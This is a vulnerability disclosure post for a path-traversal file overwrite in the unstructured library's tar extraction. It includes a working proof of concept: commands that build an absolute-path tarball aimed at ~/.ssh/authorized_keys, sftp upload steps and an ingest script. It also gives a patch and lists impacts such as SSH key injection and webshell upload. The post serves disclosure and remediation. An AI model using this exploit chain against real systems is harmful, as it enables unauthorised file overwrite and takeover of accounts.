---
layout: post
title:  "Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)"
date:  2024-05-29 10:31:06 +0800
categories: file-overwrite
---

## Name

> Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> 0.14.3

## Description

The unstructured ingest provide extra [`sftp`](https://docs.unstructured.io/open-source/ingest/source-connectors/sftp) and [`gcs`](https://docs.unstructured.io/open-source/ingest/source-connectors/google-cloud-storage) modules to batch process all documents in remote cloud storages. The [`process_compressed_doc`](https://github.com/Unstructured-IO/unstructured/blob/3158169585b0ce8bbe784762133b244271a9dec8/unstructured/ingest/utils/compression.py#L76) is called to extract the compressed tarball files to local file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar.gz files that can overwrite any file. 

Using unstructured python sdk, a victim may download malicious tarball from remote cloud storages. The call stack is following: [`DocFactory.run`](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/pipeline/doc_factory.py#L10) -> [`FsspecSourceConnector.get_ingest_docs`](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/connector/fsspec/fsspec.py#L262) -> [`CompressionSourceConnectorMixin.process_compressed_doc`](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83) -> [`uncompress_file`](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L33) -> [`uncompress_tar_file`](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66), The `uncompress_tar_file` calls `tarball.extractall` without sanitizing the members in tarball, causing members with absolute names or relative names will extracted and written outside target folder.

The [`uncompress_tar_file`](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66) function:

```
def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -> str:
    head, tail = os.path.split(tar_filename)
    for ext in TAR_FILE_EXT:
        if tail.endswith(ext):
            tail = tail[: -(len(ext))]
            break

    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
    logger.info(f"extracting tar {tar_filename} -> {path}")
    with tarfile.open(tar_filename, "r:gz") as tfile:
        tfile.extractall(path=path)
    return path
```

The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.

```
Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
```

## Proof of Concept

For simplicity, I use sftp ingest to batch process documents from a test sftp server.

First, let's start a simple sftp server using docker from [`atmoz/sftp`](https://hub.docker.com/r/atmoz/sftp/). The server is listen at my local network `10.15.0.5:2222`

```
docker run -p 2222:22 -d atmoz/sftp foo:pass:::upload
```

Next, create a malicous tar file using following command:

```
tar --absolute-names -czvf hack.tar.gz /home/kali/.ssh/authorized_keys
```

Then, upload `hack.tar.gz` to previously created sftp server. 

```
# login to sftp server, account: foo, password: pass
sftp -P 2222 foo@10.15.0.5

# cd into upload folder
sftp> cd upload

# upload hack.tar.gz
sftp> put hack.tar.gz
sftp> ls -la
-rw-r--r--    1 1000     100          2531 May 29 05:35 hack.tar.gz
```

Install `structrue` and [`structure[sftp]`](https://docs.unstructured.io/open-source/ingest/source-connectors/sftp)(using python3.10):

```
pip install unstructured
pip install "unstructured[sftp]"
```

Using [python snippets](https://docs.unstructured.io/open-source/ingest/source-connectors/sftp) in offical document to fetch all documents from sftp server, note that with `uncompress=True` set, save as `unstructured_sftp.py`:

```
from unstructured.ingest.interfaces import (
    PartitionConfig,
    ProcessorConfig,
    ReadConfig,
)
from unstructured.ingest.runner import SftpRunner

if __name__ == "__main__":
    runner = SftpRunner(
        processor_config=ProcessorConfig(
            verbose=True,
            output_dir="sftp-output",
            num_processes=2,
        ),
        read_config=ReadConfig(),
        partition_config=PartitionConfig(),
        connector_config=SimpleSftpConfig(
            access_config=SftpAccessConfig(
                username="foo",
                password="pass",
            ),
            remote_url="sftp://10.15.0.5:2222/upload",
            recursive=True,
            uncompress=True
        ),
    )
    runner.run()
```

Lauch the attack, the file `/home/kali/.ssh/authorized_keys` in local system is overwritten

```
python unstructured_sftp.py

> cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
```

Or just using [`unstructured-ingest sftp` shell command](https://docs.unstructured.io/open-source/ingest/source-connectors/sftp) with `--uncompress` enabled:

```
> unstructured-ingest \
  sftp \
  --remote-url sftp://10.15.0.5:2222/upload \
  --username "foo" \
  --password "pass" \
  --num-processes 2 \
  --recursive \
  --uncompress \
  --verbose


> cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
```


## Platform

I noticed the platform Data Ingestion Source Connectors also have `uncompress` option, For example:

[sftp-storage](https://docs.unstructured.io/platform/platform-source-connectors/sftp-storage)

![sftp](/assets/images/bughunter/unstructured/Source-SFTP.png)


[google cloud storage](https://docs.unstructured.io/platform/platform-source-connectors/google-cloud)

![gc](/assets/images/bughunter/unstructured/Source-Google-Cloud.png)

## Fix

Patch for [uncompress_tar_file](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L56C1-L67C16)

```
def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -> str:
    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
    def extraction_filter(member, path):
        """Run tarfile.tar_filter, but raise the expected ValueError"""
        # This is only called if the current Python has tarfile filters
        try:
            return tarfile.tar_filter(member, path)
        except tarfile.FilterError as exc:
            raise ValueError(str(exc))
    
    head, tail = os.path.split(tar_filename)
    for ext in TAR_FILE_EXT:
        if tail.endswith(ext):
            tail = tail[: -(len(ext))]
            break

    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
    logger.info(f"extracting tar {tar_filename} -> {path}")
    with tarfile.open(tar_filename, "r:gz") as tfile:
        tfile.extraction_filter = extraction_filter
        tfile.extractall(path=path)
    return path
```

## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.


### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89](https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89)

## Occurrences

Version v1

[https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83)

[https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66)

Version V2

[https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29](https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29)
